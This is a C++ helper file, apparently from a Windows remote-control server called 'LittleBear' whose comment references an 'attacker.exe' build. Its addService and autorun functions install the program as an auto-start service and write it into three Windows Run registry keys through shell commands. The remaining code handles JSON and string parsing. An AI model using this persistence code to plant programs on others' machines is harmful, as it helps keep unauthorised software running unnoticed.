
#include <windows.h>
#include "main.h"
#include "PublicFunc.h"
#include <Json/json.h>
#include "Public.h"
#include <string>


using namespace std;

//sc create mytest1 binpath= "\"D:\vsproject\attacker_thread\Release\attacker.exe\" --service" displayname= "mytest1" start= auto
int PublicFunction::addService(string path, string params) {
	int ret = 0;
	string servicename = "LittleBearMainServerService";
	string formatstr = "cmd /c sc create %s binPath= \"\\\"%s\\\" --service\" DisplayName= \"%s\" start= auto";
	char cmd[1024];
	wsprintfA(cmd, formatstr.c_str(), servicename.c_str(), path.c_str(), params.c_str(), servicename.c_str());
	ret = WinExec(cmd, SW_SHOW);

	wsprintfA(cmd, "net start %s", servicename.c_str());
	//ret = WinExec(cmd,SW_SHOW);
	return ret;
}

int PublicFunction::autorun() {
	char szcurpath[MAX_PATH];
	int ret = GetModuleFileNameA(0, szcurpath, MAX_PATH);
	char szRuCmd[1024];
	wsprintfA(szRuCmd, "\"%s\" %s", szcurpath, "");

	string szkeyformat1 = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v LITTLEBEARSERVERAUTORUN /t REG_SZ /d \"%s\" /f";
	char szcmd[1024];
	string szkeyformat2 = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v LITTLEBEARSERVERAUTORUN /t REG_SZ /d \"%s\" /f";

	string szkeyformat3 = "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run /v LITTLEBEARSERVERAUTORUN /t REG_SZ /d \"%s\" /f";

	int cmdlen = wsprintfA(szcmd, szkeyformat1.c_str(), szRuCmd);
	ret = WinExec(szcmd, SW_SHOW);

	cmdlen = wsprintfA(szcmd, szkeyformat2.c_str(), szRuCmd);
	ret = WinExec(szcmd, SW_SHOW);

	cmdlen = wsprintfA(szcmd, szkeyformat3.c_str(), szRuCmd);
	ret = WinExec(szcmd, SW_SHOW);
	return ret;
}


int CheckIfDataPathExist(char* strDataPath)
{
	HANDLE hFind = CreateFileA(strDataPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS, 0);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		int iRet = CreateDirectoryA(strDataPath, 0);
		if (iRet == 0)
		{
			int iError = GetLastError();
			if (iError == ERROR_ALREADY_EXISTS || iError == 5)
			{
				return TRUE;
			}
			return FALSE;
		}

		return TRUE;
	}
	else
	{
		CloseHandle(hFind);
	}

	return TRUE;
}

string makeJsonFromTxt(char* utf) {
	char* gbk = 0;
	int gbklen = UTF8ToGBK(utf, &gbk);
	if (gbklen > 0)
	{
		char* strjson = new char[gbklen + 1024];
		sprintf(strjson, "{\"key\":\"%s\"}", gbk);
		delete gbk;

		Json::Value value;
		Json::Reader reader;
		int ret = reader.parse(strjson, value);
		delete strjson;
		if (ret)
		{
			string strvalue = value["key"].asString();

			while (1)
			{
				int pos = strvalue.find("&gt;");
				if (pos >= 0)
				{
					strvalue = strvalue.replace(pos, 4, ">");
				}
				else {
					pos = strvalue.find("\r");
					if (pos >= 0)
					{
						strvalue = strvalue.replace(pos, 1, "");
					}
					else {
						pos = strvalue.find("\n");
						if (pos >= 0)
						{
							strvalue = strvalue.replace(pos, 1, "");
						}
						else {
							break;
						}
					}
				}
			}

			return strvalue;
		}
	}

	return "";
}


DWORD Get2CommandParams(char* szParam, char szCommands[2][CMD_BUFFER_SIZE], char* split)
{
	char* szHdr = szParam;
	char* szEnd = szParam;

	szEnd = strstr(szHdr, split);
	if (szEnd == FALSE)
	{
		return FALSE;
	}

	int splitlen = lstrlenA(split);
	for (int i = 0; i < splitlen; i++)
	{
		*(szEnd + i) = 0;
	}

	szEnd += splitlen;

	lstrcpyA(szCommands[0], szHdr);
	lstrcpyA(szCommands[1], szEnd);

	return TRUE;
}

int checkAccountName(string acc) {
	for (int i = 0; i < acc.length(); i++)
	{
		if (isdigit(acc.at(i)) || isalpha(acc.at(i)) || acc.at(i) == '_')
		{
			continue;
		}
		else {
			return FALSE;
		}
	}

	return TRUE;
}